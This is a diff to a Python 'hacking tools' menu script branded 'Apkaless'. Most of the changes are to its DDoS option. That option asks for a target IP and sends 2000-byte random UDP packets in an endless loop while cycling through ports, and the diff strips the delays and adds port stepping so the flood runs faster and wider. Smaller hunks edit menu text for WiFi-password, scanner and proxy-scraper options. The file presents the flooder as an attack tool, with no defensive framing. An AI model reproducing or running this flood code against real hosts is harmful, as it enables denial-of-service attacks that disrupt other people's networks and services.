@@ -17,6 +17,7 @@ try:
      import who_is_on_my_wifi
      import urllib.request
      import modulefinder
+     import datetime
      # code started
 
      def updateTool():
@@ -85,7 +86,7 @@ try:
           # print("")
           #####################################################
           s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-          bytes = random._urandom(1024)
+          bytes = random._urandom(2000)
           #####################################################
           host = input(Fore.GREEN + "Target IP: ")
           time.sleep(1)
@@ -97,26 +98,33 @@ try:
           sent = 0
           os.system("clear")
           os.system("figlet DDos Starting.....")
-          time.sleep(2)
-          print(Fore.GREEN + "[=======] 0%")
-          time.sleep(1)
-          print(Fore.GREEN + "[===============] 25%")
-          time.sleep(2)
-          print(Fore.GREEN + "[======================] 50%")
-          time.sleep(3)
-          print(Fore.GREEN + "[==========================] 75%")
-          time.sleep(4)
-          print(Fore.GREEN + "[===============================] 100%")
-          time.sleep(5)
+          # time.sleep(2)
+          # print(Fore.GREEN + "[=======] 0%")
+          # time.sleep(1)
+          # print(Fore.GREEN + "[===============] 25%")
+          # time.sleep(1)
+          # print(Fore.GREEN + "[======================] 50%")
+          # time.sleep(1)
+          # print(Fore.GREEN + "[==========================] 75%")
+          # time.sleep(1)
+          # print(Fore.GREEN + "[===============================] 100%")
+          # time.sleep(1)
           while True:
+               # try: 
+               from datetime import datetime
+               now = datetime.now()
                s.connect((host,port))
-               s.accept()
+               print("Connected\n")
                s.sendto(bytes, (host,port))
                sent = sent + 1
-               print(Fore.GREEN + Style.NORMAL + "Attacking %s packets to %s on port %s By Apkaless" %(sent,host,port))
+               port = port + 1
+               print(Fore.GREEN + Style.NORMAL + "Attacking %s packets to %s on port %s By Apkaless %s"%(sent,Style.NORMAL + host,port, now))
                if port == 66534:
                     port = 1
-
+               # except:
+               #      print("\nConnection Was Lost\n")
+               #      input("Press Enter To Back...")
+               #      starting()
      #This is The End Of Code
 
      #This Code For Scanner tool
@@ -297,6 +305,13 @@ try:
                input(Fore.GREEN + "Press Enter To Back.....")
                starting()
 
+     #=================== Starting Tools ===================#
+    #|                                                      |#
+    #|                                                      |#
+    #|                  Hacking Tools                       |#
+    #|                                                      |#
+    #|                                                      |#
+    #|======================================================|#
 
      def starting():
           print(Style.BRIGHT)
@@ -360,7 +375,7 @@ try:
 
           [4] Proxy Scraper
 
-          [5] Wifi Password
+          [5] Get Your Wifi Password
 
           [6] YouTube Video Download
 
@@ -388,7 +403,7 @@ try:
                     if platform.machine()=="AMD64":
                          wifiPassword()
                     else:
-                         print("This Option Is Not For Your Machine.")
+                         print("\nThis Option Is Not For Your Machine.")
                          time.sleep(5)
                          starting()
                if starthacking == "6":
@@ -450,7 +465,8 @@ try:
                print("Connected")
                time.sleep(1)
           except (requests.ConnectionError, requests.Timeout) as exception:
-               print("No Internet Connection.")
+               print("No Internet Connection Try Again Later.\n")
+               input("Exit...")
                exit()
           os.system("clear")
           os.system("figlet Apkaless")
